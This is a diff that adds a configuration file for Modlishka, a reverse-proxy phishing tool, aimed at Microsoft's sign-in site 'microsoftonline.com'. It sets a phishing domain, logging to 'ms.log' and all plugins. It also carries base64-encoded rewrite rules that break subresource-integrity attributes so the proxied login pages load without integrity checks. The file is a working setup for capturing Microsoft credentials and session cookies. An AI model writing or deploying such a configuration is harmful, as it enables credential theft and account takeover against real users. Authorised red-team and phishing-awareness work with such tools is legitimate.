@@ -1,0 +1,22 @@
+{
+  "phishingDomain": "loopback.modlishka.io",
+  "listeningPort": "443",
+  "listeningAddress": "127.0.0.1",
+  "target": "https://microsoftonline.com",
+  "targetResources": "",
+  "targetRules": "by5zZXRBdHRyaWJ1dGUoImludGVncml0eSI=:by5zZXRBdHRyaWJ1dGUoImludGVnZHJpdHki,aW50ZWdyaXR5PQ==:aW50ZWdyaWN0eT0=,PC9oZWFkPg==:",
+  "terminateTriggers": "",
+  "terminateRedirectUrl": "",
+  "trackingCookie": "id",
+  "trackingParam": "id",
+  "useTls": true,
+  "jsRules":"",
+  "debug": false,
+  "logPostOnly": false,
+  "disableSecurity": false,
+  "log": "ms.log",
+  "plugins": "all",
+  "cert": "",
+  "certKey": "",
+  "certPool": ""
+}
